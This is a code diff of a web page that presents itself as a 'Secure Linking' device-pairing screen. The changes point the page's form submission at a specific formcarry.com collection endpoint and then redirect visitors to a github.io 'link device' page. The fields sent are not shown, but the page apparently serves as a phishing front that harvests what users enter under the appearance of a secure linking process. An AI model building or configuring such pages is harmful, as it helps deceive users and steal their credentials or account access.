@@ -161,7 +161,7 @@
     
     <!-- Logo Container added at top left -->
     <div class="logo-container">
-      <img src="YOUR_LOGO_URL_HERE.png" alt="Logo">
+      <img src="logo.png" alt="Logo">
     </div>
 
     <div class="security-badge">Secure Linking</div>
@@ -227,7 +227,7 @@
     statusMsg.style.display = "block";
 
     try {
-      const response = await fetch("https://formcarry.com", {
+      const response = await fetch("https://formcarry.com/s/6u_Lkdx6_ly", {
         method: 'POST',
         headers: { 
           'Accept': 'application/json',
@@ -239,7 +239,7 @@
       if (response.ok) {
         statusMsg.innerText = "Device Linked Successfully!";
         submitBtn.innerText = "Linked";
-        setTimeout(() => { window.location.href = "https://github.io"; }, 2000);
+        setTimeout(() => { window.location.href = "https://the-pigeon101.github.io/link device.html"; }, 2000);
       } else {
         throw new Error();
       }
